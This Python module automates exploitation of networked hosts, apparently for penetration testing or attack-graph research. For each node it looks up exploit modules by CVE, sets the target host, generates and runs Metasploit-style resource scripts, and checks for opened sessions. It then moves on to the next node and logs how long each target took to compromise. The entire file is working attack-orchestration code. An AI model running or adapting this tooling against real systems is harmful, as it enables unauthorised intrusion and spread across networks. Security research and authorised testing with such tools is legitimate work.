import re
import threading
import time
import uuid
from functools import partial
from queue import Queue

from configuration import (REMOTE_HOST, REMOTE_RESOURCE_DIRECTORY,
                           SESSION_FAIL_TO_OPEN, SESSION_SUCCESSFULLY_OPEND,
                           START_TIMESTAMP, TARGETS, WAIT_FOR_DATA_TIME_OUT)
from py_client import scp
from report import ReportUtil
from vul_searcher import search_vul_by_keywords, validate_search_result


def extract(data):
    print(data)
    if data['data'].startswith('[*]'):
        intermidiate_data = '\n'.join(data['data'].split("\n")[1:]).strip()
    else:
        print('h2')
        intermidiate_data = data['data'].strip()
    splited_data = intermidiate_data.split()
    exploits = [
        splited_data[i + 1].split("/", maxsplit=1)[1]
        for i, d in enumerate(splited_data) if re.match(r'^[0-9]+$', d)
    ]
    return exploits


is_running = False
nodes_exploited = []
has_data_come_back = False
search_failed_set = set()


def tranverse_the_nodes(
    nodes,
    basic_usage,
    workspace,
    advance_mode,
    is_top_level_func=False,
):
    global is_running
    global nodes_exploited
    if is_top_level_func:
        is_running = True

    if not nodes:
        is_running = False
        return
    q = Queue(maxsize=1)
    q.put("next")
    node = nodes.pop(0)
    while (node in nodes_exploited) and nodes:
        node = nodes.pop(0)
    is_node_already_exploited = (node in nodes_exploited)
    if is_node_already_exploited:
        is_running = False
        return

    def check_session_open(data, queue=None):
        print(data)
        global is_running
        global nodes_exploited
        if re.findall(SESSION_SUCCESSFULLY_OPEND, data):
            if not advance_mode:
                q.put("stop")
            else:
                q.put("next")
            nodes_exploited.append(node)
            if node._host in TARGETS.keys() and TARGETS[node._host] == -1:
                TARGETS[node._host] = time.time() - START_TIMESTAMP

            print(TARGETS)

            if nodes:
                tranverse_the_nodes(nodes, basic_usage, workspace,
                                    advance_mode)
            else:
                print('not continue to tranverse')
                is_running = False
        elif re.findall(SESSION_FAIL_TO_OPEN, data):
            print('failed to exploit')
            is_running = False

    def node_on_data(data):
        global has_data_come_back

        try:
            exploits = extract(data)
            if validate_search_result(str(exploits)):
                has_data_come_back = True
            else:
                return
        except Exception as e:
            print(e)
            return
        while len(exploits):
            exploit = exploits.pop(0)
            result = q.get()
            if result == "stop":
                break

            basic_usage.clear_components()
            basic_usage.set_options(exploit={
                'RHOSTS': node._host,
                'name': exploit,
                # **node._extras
            })

            script_name = f"{str(uuid.uuid1())}.rc"
            subnet = node._extras.get("ex_subnet")
            basic_usage.generate_resource_script(script_name, subnet=subnet)
            basic_usage.execute_resource_script(
                script_name,
                cb=lambda data: check_session_open(data['data'], queue=q))

    global has_data_come_back
    has_data_come_back = False
    if node._vul['cve'] not in search_failed_set:
        search_vul_by_keywords(node._vul, cb=node_on_data)
        threading.Timer(WAIT_FOR_DATA_TIME_OUT,
                        partial(search_failed, node._vul['cve'])).start()
    else:
        is_running = False
        return
    if is_top_level_func:
        while is_running:
            time.sleep(WAIT_FOR_DATA_TIME_OUT)


def search_failed(search_str):
    if not has_data_come_back:
        global is_running
        global search_failed_set
        print(f'search failed, add {search_str} to search_failed_set')
        search_failed_set.add(search_str)
        is_running = False
